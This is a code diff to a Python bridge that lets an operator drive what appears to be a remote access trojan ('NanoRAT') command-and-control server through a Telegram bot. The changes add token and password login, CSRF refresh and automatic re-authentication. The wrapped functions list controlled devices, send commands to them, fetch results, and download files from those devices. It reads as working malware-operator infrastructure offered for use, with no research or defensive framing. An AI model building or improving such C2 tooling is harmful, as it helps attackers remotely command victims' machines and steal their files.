@@ -180,6 +180,9 @@ async def send_document(filename, data_bytes, caption="", keyboard=None,
 # every operator call would 401 with nothing pointing at the cause. If
 # nothing is found, say so and let the server be started first.
 def _resolve_operator_password():
+    if os.environ.get("C2_OPERATOR_TOKEN"):
+        return ""          # token auth needs no password
+
     explicit = os.environ.get("C2_OPERATOR_PASSWORD")
     if explicit:
         return explicit.strip()
@@ -205,33 +208,89 @@ def _resolve_operator_password():
 
 
 C2_PASSWORD = _resolve_operator_password()
+# Login is by name + password; falls back to the configured operator name.
+C2_OPERATOR_NAME = os.environ.get("C2_OPERATOR_NAME", "operator")
+
+# Optional: an API token instead of a password. Preferred for a machine
+# client — it can be rotated without touching the operator's password.
+C2_TOKEN = os.environ.get("C2_OPERATOR_TOKEN", "")
+
 _c2_session_ok = False
 _c2_csrf = ""
 
 
 def c2_headers():
     headers = {"Content-Type": "application/json"}
+    if C2_TOKEN:
+        headers["Authorization"] = f"Bearer {C2_TOKEN}"
     if _c2_csrf:
         headers["X-CSRF-Token"] = _c2_csrf
     return headers
 
 
 async def c2_login(force: bool = False) -> bool:
+    """Establish whatever the server needs before the first call.
+
+    Nothing at all in the default mode: the bridge talks to 127.0.0.1, where
+    the panel is already open. The login round trip only matters if the server
+    is running in operator mode.
+    """
     global _c2_session_ok, _c2_csrf
 
     if _c2_session_ok and not force:
         return True
-    if not C2_PASSWORD:
-        print("[c2] no operator password found — operator API will 401")
-        print("[c2]   set it:  export C2_OPERATOR_PASSWORD=...")
+
+    # Probe /api/session: an open server answers 200 immediately, so there is
+    # nothing to log into.
+    try:
+        probe = await client.get(f"{C2_BASE}/api/session",
+                                 headers={"Authorization": f"Bearer {C2_TOKEN}"}
+                                 if C2_TOKEN else {})
+        if probe.status_code == 200:
+            _c2_session_ok = True
+            if C2_TOKEN:
+                print("[c2] authenticated by token")
+                return True
+            try:
+                body = probe.json()
+            except Exception:
+                body = {}
+            if body.get("mode") == "operator" and not _c2_csrf:
+                # Session still good but the CSRF token is stale or lost —
+                # refresh it in place rather than logging in again.
+                _c2_csrf = body.get("csrf_token") or ""
+                if _c2_csrf:
+                    print("[c2] csrf token refreshed")
+                    return True
+            else:
+                print("[c2] panel is open, no login needed")
+                return True
+    except Exception as exc:
+        print(f"[c2] probe failed: {exc}")
+
+    if not C2_TOKEN and not C2_PASSWORD:
+        print("[c2] no operator credential found — operator API will 401")
+        print("[c2]   token   : export C2_OPERATOR_TOKEN=...   (preferred)")
+        print("[c2]   password: export C2_OPERATOR_NAME=... C2_OPERATOR_PASSWORD=...")
         print("[c2]   or read: cat data/c2_operator_password.secret")
-        print("[c2]   (the server must be started with the same value)")
         return False
 
     try:
+        if C2_TOKEN:
+            # Token auth: no login round trip, no CSRF (there is no cookie
+            # session to forge against).
+            s = await client.get(f"{C2_BASE}/api/operators/me",
+                                 headers={"Authorization": f"Bearer {C2_TOKEN}"})
+            if s.status_code != 200:
+                print(f"[c2] token refused: HTTP {s.status_code}")
+                return False
+            _c2_session_ok = True
+            print(f"[c2] authenticated by token as {s.json().get('name')}")
+            return True
+
         r = await client.post(
             f"{C2_BASE}/login",
-            data={"password": C2_PASSWORD},
+            data={"name": C2_OPERATOR_NAME, "password": C2_PASSWORD},
             headers={"Content-Type": "application/x-www-form-urlencoded"},
         )
         if r.status_code not in (200, 302):
@@ -245,7 +304,7 @@ async def c2_login(force: bool = False) -> bool:
 
         _c2_csrf = s.json().get("csrf_token", "")
         _c2_session_ok = True
-        print("[c2] operator session established")
+        print(f"[c2] operator session established as {s.json().get('operator')}")
         return True
     except Exception as e:
         print(f"[c2] login error: {e}")
@@ -256,48 +315,57 @@ async def _ensure_session() -> bool:
     return await c2_login()
 
 
-async def c2_devices():
+async def c2_call(method: str, url: str, **kwargs):
+    """Every operator-API call goes through here.
+
+    A session can expire or a CSRF token can go stale while the bridge keeps
+    running, and a bare 401/403 would leave it stuck forever with no
+    explanation. Re-authenticate once and retry.
+    """
     if not await _ensure_session():
-        return []
+        return None
+
+    response = await client.request(method, url, headers=c2_headers(), **kwargs)
+
+    if response.status_code in (401, 403) and not C2_TOKEN:
+        await c2_login(force=True)
+        response = await client.request(method, url, headers=c2_headers(), **kwargs)
+
+    return response
+
+
+async def c2_devices():
     try:
-        r = await client.get(f"{C2_BASE}/api/devices", headers=c2_headers())
-        return r.json()
+        r = await c2_call("GET", f"{C2_BASE}/api/devices")
+        return r.json() if r is not None else []
     except Exception:
         return []
 
 
 async def c2_device(dev_id):
-    if not await _ensure_session():
-        return None
     try:
-        r = await client.get(f"{C2_BASE}/api/device/{dev_id}", headers=c2_headers())
-        return r.json()
+        r = await c2_call("GET", f"{C2_BASE}/api/device/{dev_id}")
+        return r.json() if r is not None else None
     except Exception:
         return None
 
 
 async def c2_send_command(dev_id, ctype, args):
-    if not await _ensure_session():
-        return {"error": "no_session"}
     try:
-        r = await client.post(
-            f"{C2_BASE}/api/device/{dev_id}/command",
-            headers=c2_headers(),
-            json={"type": ctype, "args": args},
-        )
+        r = await c2_call("POST", f"{C2_BASE}/api/device/{dev_id}/command",
+                          json={"type": ctype, "args": args})
+        if r is None:
+            return {"error": "no_session"}
         return r.json()
     except Exception as e:
         return {"error": str(e)}
 
 
 async def c2_command_result(dev_id, cmd_id):
-    if not await _ensure_session():
-        return None
     try:
-        r = await client.get(
-            f"{C2_BASE}/api/device/{dev_id}/commands",
-            headers=c2_headers(),
-        )
+        r = await c2_call("GET", f"{C2_BASE}/api/device/{dev_id}/commands")
+        if r is None:
+            return None
         for c in r.json():
             if c["id"] == cmd_id:
                 return c
@@ -317,23 +385,17 @@ async def c2_wait_result(dev_id, cmd_id, timeout=30):
 
 
 async def c2_files(dev_id):
-    if not await _ensure_session():
-        return []
     try:
-        r = await client.get(f"{C2_BASE}/api/device/{dev_id}/files",
-                             headers=c2_headers())
-        return r.json()
+        r = await c2_call("GET", f"{C2_BASE}/api/device/{dev_id}/files")
+        return r.json() if r is not None else []
     except Exception:
         return []
 
 
 async def c2_file_bytes(file_id):
-    if not await _ensure_session():
-        return None
     try:
-        r = await client.get(f"{C2_BASE}/api/file/{file_id}/raw",
-                             headers=c2_headers())
-        return r.content
+        r = await c2_call("GET", f"{C2_BASE}/api/file/{file_id}/raw")
+        return r.content if r is not None else None
     except Exception:
         return None
 
@@ -1191,6 +1253,15 @@ async def handle_text(text):
 async def poll_loop():
     offset = 0
     print("[bridge] starting poll loop")
+
+    # Authenticate now rather than on the first command, so a bad config is
+    # visible in the log immediately instead of surfacing as a failed command
+    # much later.
+    if await c2_login():
+        print(f"[bridge] control server reachable at {C2_BASE}")
+    else:
+        print("[bridge] continuing, but operator commands will fail")
+
     await send_message("🚀 *NanoRAT bridge online*")
 
     while True:
